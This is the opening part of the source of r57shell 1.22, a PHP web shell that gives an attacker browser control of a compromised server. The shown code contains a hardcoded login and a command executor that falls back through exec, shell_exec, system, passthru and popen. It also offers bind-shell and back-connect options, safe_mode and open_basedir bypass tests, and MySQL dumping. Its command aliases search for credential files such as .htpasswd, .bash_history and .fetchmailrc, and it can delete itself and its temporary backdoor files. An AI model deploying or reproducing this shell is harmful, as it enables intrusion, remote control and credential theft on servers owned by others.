<?php
/******************************************************************************************************/
/*
/*                                     #    #        #    #
/*                                     #   #          #   #
/*                                    #    #          #    #
/*                                    #   ##   ####   ##   #
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##  ######  ##   ##
/*                                   ##   ##   ####   ##   ##
/*                                   ###   ############   ###
/*                                   ########################
/*                                        ##############
/*                                 ######## ########## #######
/*                                ###   ##  ##########  ##   ###
/*                                ###   ##  ##########  ##   ###
/*                                 ###   #  ##########  #   ###
/*                                 ###   ##  ########  ##   ###
/*                                  ##    #   ######   #    ##
/*                                   ##   #    ####   #    ##
/*                                     ##                 ##
/*
/*
/*
/*  r57shell.php - ñêðèïò íà ïõï ïîçâîëÿþùèé âàì âûïîëíÿòü øåëë êîìàíäû  íà ñåðâåðå ÷åðåç áðàóçåð
/*  Âû ìîæåòå ñêà÷àòü íîâóþ âåðñèþ íà íàøåì ñàéòå: http://rst.void.ru
/*  Âåðñèÿ: 1.22
/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
/*  (c)oded by 1dt.w0lf
/*  RST/GHC http://rst.void.ru , http://ghc.ru
/******************************************************************************************************/

/* ~~~ Íàñòðîéêè  ~~~ */
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "1.22";

// $HTTP_POST_VARS --> $_POST
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }

/* magic_quotes */
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k]=stripslashes($v);
  }
 }

/* ~~~ Àóòåíòèôèêàöèÿ ~~~ */

// Ëîãèí è ïàðîëü äëÿ äîñòóïà ê ñêðèïòó
// ÍÅ ÇÀÁÓÄÜÒÅ ÑÌÅÍÈÒÜ ÏÅÐÅÄ ÐÀÇÌÅÙÅÍÈÅÌ ÍÀ ÑÅÐÂÅÐÅ!!!
$name="r57"; // ëîãèí ïîëüçîâàòåëÿ
$pass="r57"; // ïàðîëü ïîëüçîâàòåëÿ

if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!=$name || $_SERVER['PHP_AUTH_PW']!=$pass)
   {
   header("WWW-Authenticate: Basic realm=\"r57shell\"");
   header("HTTP/1.0 401 Unauthorized");
   exit("<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>");
   }
$head = '<!-- Çäðàâñòâóé  Âàñÿ -->
<html>
<head>
<title>r57shell</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>';


/* show phpinfo */
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
/* delete script */
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
/* delete tmp files */
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
/* show php.ini vars */
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }

 function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }

if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=-2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
/* info about cpu */
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
/* info about mem */
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=-2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=-2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=-2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }

/*
Âûáîð ÿçûêà
$language='ru' - ðóññêèé
$language='eng' - àíãëèéñêèé
*/
$language='ru';

$lang=array(
'ru_text1' =>'Âûïîëíåííàÿ êîìàíäà',
'ru_text2' =>'Âûïîëíåíèå êîìàíä íà ñåðâåðå',
'ru_text3' =>'Âûïîëíèòü êîìàíäó',
'ru_text4' =>'Ðàáî÷àÿ äèðåêòîðèÿ',
'ru_text5' =>'Çàãðóçêà ôàéëîâ íà ñåðâåð',
'ru_text6' =>'Ëîêàëüíûé ôàéë',
'ru_text7' =>'Àëèàñû',
'ru_text8' =>'Âûáåðèòå àëèàñ',
'ru_butt1' =>'Âûïîëíèòü',
'ru_butt2' =>'Çàãðóçèòü',
'ru_text9' =>'Îòêðûòèå ïîðòà è ïðèâÿçêà åãî ê /bin/bash',
'ru_text10'=>'Îòêðûòü ïîðò',
'ru_text11'=>'Ïàðîëü äëÿ äîñòóïà',
'ru_butt3' =>'Îòêðûòü',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-àäðåñ',
'ru_text14'=>'Ïîðò',
'ru_butt4' =>'Âûïîëíèòü',
'ru_text15'=>'Çàãðóçêà ôàéëîâ ñ óäàëåííîãî ñåðâåðà',
'ru_text16'=>'Èñïîëüçîâàòü',
'ru_text17'=>'Óäàëåííûé ôàéë',
'ru_text18'=>'Ëîêàëüíûé ôàéë',
'ru_text19'=>'Exploits',
'ru_text20'=>'Èñïîëüçîâàòü',
'ru_text21'=>'Íîâîå èìÿ',
'ru_text22'=>'datapipe',
'ru_text23'=>'Ëîêàëüíûé ïîðò',
'ru_text24'=>'Óäàëåííûé õîñò',
'ru_text25'=>'Óäàëåííûé ïîðò',
'ru_text26'=>'Èñïîëüçîâàòü',
'ru_butt5' =>'Çàïóñòèòü',
'ru_text28'=>'Ðàáîòà â safe_mode',
'ru_text29'=>'Äîñòóï çàïðåùåí',
'ru_butt6' =>'Ñìåíèòü',
'ru_text30'=>'Ïðîñìîòð ôàéëà',
'ru_butt7' =>'Âûâåñòè',
'ru_text31'=>'Ôàéë íå íàéäåí',
'ru_text32'=>'Âûïîëíåíèå PHP êîäà',
'ru_text33'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé open_basedir ÷åðåç ôóíêöèè cURL',
'ru_butt8' =>'Ïðîâåðèòü',
'ru_text34'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç ôóíêöèþ include',
'ru_text35'=>'Ïðîâåðêà âîçìîæíîñòè îáõîäà îãðàíè÷åíèé safe_mode ÷åðåç çàãðóçêó ôàéëà â mysql',
'ru_text36'=>'&nbsp;&nbsp;&nbsp;&nbsp;Áàçà',
'ru_text37'=>'Ëîãèí',
'ru_text38'=>'Ïàðîëü&nbsp;&nbsp;',
'ru_text39'=>'Òàáëèöà',
'ru_text40'=>'Äàìï òàáëèöû mysql ñåðâåðà',
'ru_butt9' =>'Äàìï',
'ru_text41'=>'Ñîõðàíèòü äàìï â ôàéëå',
'ru_text42'=>'Ðåäàêòèðîâàíèå ôàéëà',
'ru_text43'=>'Ðåäàêòèðîâàòü ôàéë',
'ru_butt10'=>'Ñîõðàíèòü',
'ru_butt11'=>'Ðåäàêòèðîâàòü',
'ru_text44'=>'Ðåäàêòèðîâàíèå ôàéëà íåâîçìîæíî! Äîñòóï òîëüêî äëÿ ÷òåíèÿ!',
'ru_text45'=>'Ôàéë ñîõðàíåí',
'ru_text46'=>'Ïðîñìîòð phpinfo()',
'ru_text47'=>'Ïðîñìîòð íàñòðîåê php.ini',
'ru_text48'=>'Óäàëåíèå âðåìåííûõ ôàéëîâ',
'ru_text49'=>'Óäàëåíèå ñêðèïòà ñ ñåðâåðà',
'ru_text50'=>'Èíôîðìàöèÿ î ïðîöåññîðå',
'ru_text51'=>'Èíôîðìàöèÿ î ïàìÿòè',
'ru_text52'=>'Òåêñò äëÿ ïîèñêà',
'ru_text53'=>'Èñêàòü â ïàïêå',
'ru_text54'=>'Ïîèñê òåêñòà â ôàéëàõ',
'ru_butt12'=>'Íàéòè',
'ru_text55'=>'Òîëüêî â ôàéëàõ',
'ru_text56'=>'Íè÷åãî íå íàéäåíî',
'ru_text57'=>'Ñîçäàòü/Óäàëèòü Ôàéë/Äèðåêòîðèþ',
'ru_text58'=>'Èìÿ',
'ru_text59'=>'Ôàéë',
'ru_text60'=>'Äèðåêòîðèþ',
'ru_butt13'=>'Ñîçäàòü/Óäàëèòü',
'ru_text61'=>'Ôàéë ñîçäàí',
'ru_text62'=>'Äèðåêòîðèÿ ñîçäàíà',
'ru_text63'=>'Ôàéë óäàëåí',
'ru_text64'=>'Äèðåêòîðèÿ óäàëåíà',
'ru_text65'=>'Ñîçäàòü',
'ru_text66'=>'Óäàëèòü',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'Êîìàíäà',
'ru_text69'=>'Ïàðàìåòð1',
'ru_text70'=>'Ïàðàìåòð2',
'ru_text71'=>"Âòîðîé ïàðàìåòð êîìàíäû:\r\n- äëÿ CHOWN - èìÿ íîâîãî ïîëüçîâàòåëÿ èëè åãî UID (÷èñëîì) \r\n- äëÿ êîìàíäû CHGRP - èìÿ ãðóïïû èëè GID (÷èñëîì) \r\n- äëÿ êîìàíäû CHMOD - öåëîå ÷èñëî â âîñüìåðè÷íîì ïðåäñòàâëåíèè (íàïðèìåð 0777)",
'ru_text72'=>'Òåêñò äëÿ ïîèñêà',
'ru_text73'=>'Èñêàòü â ïàïêå',
'ru_text74'=>'Èñêàòü â ôàéëàõ',
'ru_text75'=>'* ìîæíî èñïîëüçîâàòü ðåãóëÿðíîå âûðàæåíèå',
'ru_text76'=>'Ïîèñê òåêñòà â ôàéëàõ ñ ïîìîùüþ óòèëèòû find',
/* --------------------------------------------------------------- */
'eng_text1' =>'Executed command',
'eng_text2' =>'Execute command on server',
'eng_text3' =>'&nbsp;Run command',
'eng_text4' =>'Work directory',
'eng_text5' =>'Upload files on server',
'eng_text6' =>'Local file',
'eng_text7' =>'Aliases',
'eng_text8' =>'Select alias',
'eng_butt1' =>'Execute',
'eng_butt2' =>'Upload',
'eng_text9' =>'Bind port to /bin/bash',
'eng_text10'=>'Port',
'eng_text11'=>'Password for access',
'eng_butt3' =>'Bind',
'eng_text12'=>'back-connect',
'eng_text13'=>'IP',
'eng_text14'=>'Port',
'eng_butt4' =>'Connect',
'eng_text15'=>'Upload files from remote server',
'eng_text16'=>'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;With',
'eng_text17'=>'&nbsp;&nbsp;Remote file',
'eng_text18'=>'&nbsp;&nbsp;&nbsp;Local file',
'eng_text19'=>'Exploits',
'eng_text20'=>'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Use',
'eng_text21'=>'&nbsp;New name',
'eng_text22'=>'datapipe',
'eng_text23'=>'Local port',
'eng_text24'=>'Remote host',
'eng_text25'=>'Remote port',
'eng_text26'=>'Use',
'eng_butt5' =>'Run',
'eng_text28'=>'Work in safe_mode',
'eng_text29'=>'ACCESS DENIED',
'eng_butt6' =>'Change',
'eng_text30'=>'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cat file',
'eng_butt7' =>'  Show  ',
'eng_text31'=>'File not found',
'eng_text32'=>'Eval PHP code',
'eng_text33'=>'Test bypass open_basedir with cURL functions',
'eng_butt8' =>'Test',
'eng_text34'=>'Test bypass safe_mode with include function',
'eng_text35'=>'Test bypass safe_mode with load file in mysql',
'eng_text36'=>'Database',
'eng_text37'=>'Login',
'eng_text38'=>'Password',
'eng_text39'=>'Table',
'eng_text40'=>'Dump table from mysql server',
'eng_butt9' =>'Dump',
'eng_text41'=>'Save dump in file',
'eng_text42'=>'Edit files',
'eng_text43'=>'File for edit',
'eng_butt10'=>'Save',
'eng_text44'=>'Can\'t edit file! Only read access!',
'eng_text45'=>'File saved',
'eng_text46'=>'Show phpinfo()',
'eng_text47'=>'Show variables from php.ini',
'eng_text48'=>'Delete temp files',
'eng_butt11'=>'Edit file',
'eng_text49'=>'Delete script from server',
'eng_text50'=>'View cpu info',
'eng_text51'=>'View memory info',
'eng_text52'=>'Find text',
'eng_text53'=>'In dirs',
'eng_text54'=>'Find text in files',
'eng_butt12'=>'Find',
'eng_text55'=>'Only in files',
'eng_text56'=>'Nothing :(',
'eng_text57'=>'Create/Delete File/Dir',
'eng_text58'=>'name',
'eng_text59'=>'file',
'eng_text60'=>'dir',
'eng_butt13'=>'Create/Delete',
'eng_text61'=>'File created',
'eng_text62'=>'Dir created',
'eng_text63'=>'File deleted',
'eng_text64'=>'Dir deleted',
'eng_text65'=>'Create',
'eng_text66'=>'Delete',
'eng_text67'=>'Chown/Chgrp/Chmod',
'eng_text68'=>'Command',
'eng_text69'=>'param1',
'eng_text70'=>'param2',
'eng_text71'=>"Second commands param is:\r\n- for CHOWN - name of new owner or UID\r\n- for CHGRP - group name or GID\r\n- for CHMOD - 0777, 0755...",
'eng_text72'=>'Text for find',
'eng_text73'=>'Find in folder',
'eng_text74'=>'Find in files',
'eng_text75'=>'* you can use regexp',
'eng_text76'=>'Search text in files via find',
);

/*
Àëèàñû êîìàíä
Ïîçâîëÿþò èçáåæàòü ìíîãîêðàòíîãî íàáîðà îäíèõ è òåõ-æå êîìàíä. ( Ñäåëàíî áëàãîäàðÿ ìîåé ïðèðîäíîé ëåíè )
Âû ìîæåòå ñàìè äîáàâëÿòü èëè èçìåíÿòü êîìàíäû.
*/

$aliases=array(
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ suid áèòîì */
'find suid files'=>'find / -type f -perm -04000 -ls',
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ ñ suid áèòîì */
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ ñ sgid áèòîì */
'find sgid files'=>'find / -type f -perm -02000 -ls',
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ ñ sgid áèòîì */
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
/* ïîèñê íà ñåðâåðå ôàéëîâ config.inc.php */
'find config.inc.php files'=>'find / -type f -name config.inc.php',
/* ïîèñê â òåê äèðå config.inc.php */
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
/* ïîèñê íà ñåðâåðå ôàéëîâ config* */
'find config* files'=>'find / -type f -name "config*"',
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ config* */
'find config* files in current dir'=>'find . -type f -name "config*"',
/* ïîèñê íà ñåðâåðå âñåõ ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable files'=>'find / -type f -perm -2 -ls',
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
/* ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable directories'=>'find /  -type d -perm -2 -ls',
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ äèðåêòîðèé äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
/* ïîèñê íà ñåðâåðå âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable directories and files'=>'find / -perm -2 -ls',
/* ïîèñê â òåêóùåé äèðåêòîðèè âñåõ äèðåêòîðèé è ôàéëîâ äîñòóïíûõ íà çàïèñü äëÿ âñåõ */
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
/* ïîèñê íà ñåðâåðå ôàéëîâ service.pwd ... frontpage =))) */
'find all service.pwd files'=>'find / -type f -name service.pwd',
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ service.pwd */
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
/* ïîèñê íà ñåðâåðå ôàéëîâ .htpasswd */
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .htpasswd */
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
/* ïîèñê âñåõ ôàéëîâ .bash_history */
'find all .bash_history files'=>'find / -type f -name .bash_history',
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .bash_history */
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
/* ïîèñê âñåõ ôàéëîâ .fetchmailrc */
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
/* ïîèñê â òåêóùåé äèðåêòîðèè ôàéëîâ .fetchmailrc */
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
/* âûâîä ñïèñêà àòðèáóòîâ ôàéëîâ íà ôàéëîâîé ñèñòåìå ext2fs */
'list file attributes on a Linux second extended file system'=>'lsattr -va',
/* ïðîñìîòð îòêðûòûõ ïîðòîâ */
'show opened ports'=>'netstat -an | grep -i listen',
'----------------------------------------------------------------------------------------------------'=>'ls -la'
);

/* html */
$table_up1  = "<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: ";
$table_up2  = " ::</div></b></font></td></tr><tr><td>";
$table_up3  = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>";
$table_end1 = "</td></tr>";
$arrow      = " <font face=Wingdings color=gray>è</font>";
$lb         = "<font color=black>[</font>";
$rb         = "<font color=black>]</font>";
$font       = "<font face=Verdana size=-2>";

/* change dir */
if (!empty($_POST['dir'])) { @chdir($_POST['dir']); }
$dir = @getcwd();

/* get OS */
$windows = 0;
$unix = 0;
if(strlen($dir)>1 && $dir[1]==":") $windows=1; else $unix=1;
if(empty($dir))
 { // íà ñëó÷àé åñëè íå óäàëîñü ïîëó÷èòü äèðåêòîðèþ
 $os = getenv('OS');
 if(empty($os)){ $os = php_uname(); } // ïðîáóåì ïîëó÷èòü ÷åðåç php_uname()
 if(empty($os)){ $os ="-"; $unix=1; } // åñëè íè÷åãî íå ïîëó÷èëîñü òî áóäåò unix =)
 else
    {
    if(@eregi("^win",$os)) { $windows = 1; }
    else { $unix = 1; }
    }
 }


/* search text in files */
if(!empty($_POST['s_dir']) && !empty($_POST['s_text']) && !empty($_POST['cmd']) && $_POST['cmd'] == "search_text")
  {
    echo $head;
    if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text'],$_POST['s_mask']); }
    else { $sr = new SearchResult($_POST['s_dir'],$_POST['s_text']); }
    $sr->SearchText(0,0);
    $res = $sr->GetResultFiles();
    $found = $sr->GetMatchesCount();
    $titles = $sr->GetTitles();
    $r = "";
    if($found > 0)
    {
      $r .= "<TABLE width=100%>";
      foreach($res as $file=>$v)
      {
        $r .= "<TR>";
        $r .= "<TD colspan=2><font face=Verdana size=-2><b>".ws(3);
        $r .= ($windows)? str_replace("/","\\",$file) : $file;
        $r .= "</b></font></ TD>";
        $r .= "</TR>";
        foreach($v as $a=>$b)
        {
          $r .= "<TR>";
          $r .= "<TD align=center><B><font face=Verdana size=-2>".$a."</font></B></TD>";
          $r .= "<TD><font face=Verdana size=-2>".ws(2).$b."</font></TD>";
          $r .= "</TR>\n";
        }
      }
      $r .= "</TABLE>";
    echo $r;
    }
    else
    {
      echo "<P align=center><B><font face=Verdana size=-2>".$lang[$language.'_text56']."</B></font></P>";
    }
  echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
  die(); // show founded strings and die
  }

/* Ïðîâåðêà òîãî ìîæåì ëè ìû âûïîëíÿòü êîìàíäû ïðè âûêëþ÷åííîì safe_mode. Åñëè íåò òî ñ÷èòàåì ÷òî ñåéô âêëþ÷åí */
/* Îáõîäèò íåâîçìîæíîñòü âûïîëíåíèÿ êîìàíä íà âèíäå êîãäà ñåéô âûêëþ÷åí íî cmd.exe ïåðåèìåíîâàí                */
/* ëèáî êîãäà â php.ini ïðîïèñàíû disable_functions                                                            */
if($windows&&!$safe_mode)
 {
 $uname = ex("ver");
 if(empty($uname)) { $safe_mode = 1; }
 }
else if($unix&&!$safe_mode)
 {
 $uname = ex("uname");
 if(empty($uname)) { $safe_mode = 1; }
 }

/* get server info */
$SERVER_SOFTWARE = getenv('SERVER_SOFTWARE');
if(empty($SERVER_SOFTWARE)){ $SERVER_SOFTWARE = "-"; }

/* FUNCTIONS */

/* WriteSpace */
/* tnx to virus for idea */
function ws($i)
{
return @str_repeat("&nbsp;",$i);
}

function ex($cfe)
{
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 if(!empty($res)) return $res; else return 0;
}

/* write error */
function we($i)
{
if($GLOBALS['language']=="ru"){ $text = 'Îøèáêà! Íå ìîãó çàïèñàòü â ôàéë '; }
else { $text = "[-] ERROR! Can't write in file "; }
echo "<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
}

/* read error */
function re($i)
{
if($GLOBALS['language']=="ru"){ $text = 'Îøèáêà! Íå ìîãó ïðî÷èòàòü ôàéë '; }
else { $text = "[-] ERROR! Can't read file "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
}

/* create error */
function ce($i)
{
if($GLOBALS['language']=="ru"){ $text = "Íå óäàëîñü ñîçäàòü "; }
else { $text = "Can't create "; }
echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=center><b>".$text.$i."</b></div></font></td></tr></table>";
}

/* permissions */
function perms($mode)
{
if ($GLOBALS['windows']) return 0;
if( $mode & 0x1000 ) $type='p';
else if( $mode & 0x2000 ) $type='c';
else if( $mode & 0x4000 ) $type='d';
else if( $mode & 0x6000 ) $type='b';
else if( $mode & 0x8000 ) $type='-';
else if( $mode & 0xA000 ) $type='l';
else if( $mode & 0xC000 ) $type='s';
else $type='u';
$owner["read"] = ($mode & 00400) ? 'r' : '-';
$owner["write"] = ($mode & 00200) ? 'w' : '-';
$owner["execute"] = ($mode & 00100) ? 'x' : '-';
$group["read"] = ($mode & 00040) ? 'r' : '-';
$group["write"] = ($mode & 00020) ? 'w' : '-';
$group["execute"] = ($mode & 00010) ? 'x' : '-';
$world["read"] = ($mode & 00004) ? 'r' : '-';
$world["write"] = ($mode & 00002) ? 'w' : '-';
$world["execute"] = ($mode & 00001) ? 'x' : '-';
if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
$s=sprintf("%1s", $type);
$s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
$s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
$s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
return trim($s);
}

/* find path to */
function which($pr)
{
if ($GLOBALS['windows']) { return 0; }
$path = ex("which $pr");
if(!empty($path)) return $path; else return 0;
}

/* create file */
function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or we($fname);
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}

if (!@function_exists("view_size"))
{
function view_size($size)
{
 if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
 elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
 elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
 else {$size = $size . " B";}
 return $size;
}
}

function DirFiles($dir,$types='')
  {
    $files = Array();
    if($handle = @opendir($dir))
    {
      while (false !== ($file = @readdir($handle)))
      {
        if ($file != "." && $file != "..")
        {
          if(!is_dir($dir."/".$file))
